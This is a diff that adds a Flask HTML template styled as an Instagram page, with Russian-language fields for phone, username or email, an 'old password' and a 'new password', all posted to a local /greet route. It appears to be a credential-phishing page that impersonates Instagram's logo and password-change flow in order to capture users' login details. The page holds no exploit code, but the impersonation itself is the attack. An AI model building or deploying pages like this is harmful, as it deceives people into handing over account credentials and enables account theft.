@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Registration</title>
+    <!-- Подключение Bootstrap CSS -->
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+    />
+    <style>
+      .form-container {
+        max-width: 600px; /* Максимальная ширина формы */
+        margin: 0 auto; /* Центрирование формы */
+        padding: 30px; /* Отступы вокруг формы */
+        border: 1px solid #ddd; /* Граница формы */
+        border-radius: 10px; /* Закругленные углы */
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2); /* Тень */
+      }
+
+      .form-control-lg {
+        border-radius: 0.5rem; /* Закругление углов полей ввода */
+        padding: 1rem; /* Отступ внутри полей ввода */
+        font-size: 1rem; /* Размер шрифта */
+        border: 1px solid #ced4da; /* Граница полей ввода */
+        width: 55%;
+      }
+
+      .form-control-lg:focus {
+        border-color: #007bff; /* Цвет границы при фокусе */
+        box-shadow: 0 0 0 0.2rem rgba(38, 143, 255, 0.25); /* Тень при фокусе */
+      }
+
+      .btn-primary {
+        background-color: #007bff; /* Цвет фона кнопки */
+        border: none; /* Убираем границу */
+        border-radius: 1.5rem; /* Закругление углов кнопки */
+        padding: 0.75rem 1.5rem; /* Отступы внутри кнопки */
+        font-size: 1rem; /* Размер шрифта */
+        width: 60%;
+        color: white;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, inherit, Impact, Haettenschweiler,
+          'Arial Narrow Bold', sans-serif;
+      }
+
+      .btn-primary:hover {
+        background-color: #0056b3; /* Цвет фона кнопки при наведении */
+        border: none; /* Убираем границу */
+      }
+
+      .form-group {
+        margin-bottom: 1.5rem; /* Отступ между группами полей ввода */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container d-flex justify-content-center align-items-center min-vh-100">
+      <div class="form-container">
+        <!-- Navbar -->
+        <nav class="navbar navbar-expand-lg navbar-light bg-light mb-4">
+          <a class="navbar-brand" href="#">
+            <img
+              src="{{ url_for('static', filename='images/insta.png') }}"
+              alt="Instagram Logo"
+              width="150"
+            />
+          </a>
+        </nav>
+
+        <!-- Main content -->
+        <div class="text-center">
+          <!-- Greet form -->
+          <form method="POST" action="/greet" class="mb-4">
+            <div class="form-group">
+              <input
+                type="text"
+                name="username"
+                class="form-control form-control-lg"
+                placeholder="Телефон, имя пользователя или эл. адрес"
+              />
+            </div>
+            <div class="form-group">
+              <input
+                type="password"
+                name="password"
+                class="form-control form-control-lg"
+                placeholder="Старый пароль"
+              />
+            </div>
+            <div class="form-group">
+              <input
+                type="password"
+                name="password"
+                class="form-control form-control-lg"
+                placeholder="Новый пароль"
+              />
+            </div>
+            <button type="submit" class="btn btn-primary">Изменить</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <!-- Подключение Bootstrap JS -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+  </body>
+</html>
